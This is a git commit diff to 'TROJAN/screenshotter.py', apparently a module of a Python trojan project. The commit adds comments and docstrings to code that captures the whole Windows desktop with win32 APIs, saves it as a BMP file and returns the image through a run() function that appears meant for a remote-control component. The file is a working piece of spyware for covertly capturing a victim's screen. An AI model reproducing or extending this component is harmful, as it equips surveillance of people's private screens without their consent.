8f590b41ab768018e1ac625697ed3f577d0fd0db
fToxicw <ftoxicw@163.com>
2022-07-01 14:24:30 +0800

    Update screenshotter.py

--- TROJAN/screenshotter.py
+++ TROJAN/screenshotter.py
@@ -6,8 +6,9 @@ I don't know a lot about these, so inform me if you saw something wrong.
 import base64  # Encoder
 import win32api  # Windows APIs
 import win32con
-import win32gui
-import win32ui
+import win32gui  # Windows GUI
+import win32ui  # Windows UI
+
 
 def get_dimensions():
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
@@ -16,30 +17,37 @@ def get_dimensions():
     top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
     return (width, height, left, top)
 
-# Take screenshot
+
 def screenshot(name='screenshot'):
-    hdesktop = win32gui.GetDesktopWindow()
+    '''
+    Take a screenshot.
+    '''
+    hdesktop = win32gui.GetDesktopWindow()  # Get the window part of the desktop
     width, height, left, top = get_dimensions()
 
     desktop_dc = win32gui.GetWindowDC(hdesktop)
     img_dc = win32ui.CreateDCFromHandle(desktop_dc)
     mem_dc = img_dc.CreateCompatibleDC()
 
-    screenshot = win32ui.CreateBitmap()
+    screenshot = win32ui.CreateBitmap()  # Take screenshot
     screenshot.CreateCompatibleBitmap(img_dc, width, height)
     mem_dc.SelectObject(screenshot)
     mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')
+    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')  # Save screenshot as a bmp file
 
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
-# Run the program
+
 def run():
+    '''
+    Run.
+    '''
     screenshot()
     with open('screenshot.bmp') as f:
         img = f.read()
     return img
+
 
 if __name__ == '__main__':
     screenshot()
